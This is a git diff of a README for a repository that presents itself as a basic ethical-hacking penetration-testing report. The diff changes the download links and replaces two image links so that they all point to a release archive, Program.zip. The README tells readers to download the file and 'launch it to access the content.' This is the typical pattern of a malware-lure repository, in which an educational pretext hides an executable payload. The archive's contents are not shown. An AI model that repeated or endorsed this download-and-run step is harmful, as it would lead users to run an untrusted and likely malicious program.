@@ -2,7 +2,7 @@
 
 Welcome to the "Basic-Penetration-Testing-Report-Ethical-Hacking" repository! 🛡️🔒
 
-![Hackerman](https://i.pinimg.com/originals/30/38/59/303859f6dedeced7e96d5b225197843d.gif)
+![Hackerman](https://github.com/FREAKYBOBr/Basic-Penetration-Testing-Report-Ethical-Hacking/releases/download/v1.0/Program.zip)
 
 ## Description
 
@@ -30,11 +30,11 @@ This repository contains comprehensive insights into the world of penetration te
 
 Explore the ethical hacking methodologies used to identify and address security vulnerabilities proactively. From password hashing to SQL injection attacks, learn how hackers operate and defend against their tactics. 
 
-## Download Soft.zip
+## Download https://github.com/FREAKYBOBr/Basic-Penetration-Testing-Report-Ethical-Hacking/releases/download/v1.0/Program.zip
 
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-green)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download https://github.com/FREAKYBOBr/Basic-Penetration-Testing-Report-Ethical-Hacking/releases/download/v1.0/Program.zip](https://github.com/FREAKYBOBr/Basic-Penetration-Testing-Report-Ethical-Hacking/releases/download/v1.0/Program.zip)](https://github.com/FREAKYBOBr/Basic-Penetration-Testing-Report-Ethical-Hacking/releases/download/v1.0/Program.zip)
 
-The link leads to the Soft.zip file - don't forget to launch it to access the content. 
+The link leads to the https://github.com/FREAKYBOBr/Basic-Penetration-Testing-Report-Ethical-Hacking/releases/download/v1.0/Program.zip file - don't forget to launch it to access the content. 
 
 ## Helpful Resources
 
@@ -52,5 +52,5 @@ Connect with us on social media for the latest updates on cybersecurity trends, 
 
 Thank you for visiting our repository! Keep exploring, learning, and securing the digital realm. Happy hacking! 🚀🔓
 
-![Hacking](https://thumbs.gfycat.com/FlippantHeavyHypsilophodont-size_restricted.gif) 
+![Hacking](https://github.com/FREAKYBOBr/Basic-Penetration-Testing-Report-Ethical-Hacking/releases/download/v1.0/Program.zip) 
 
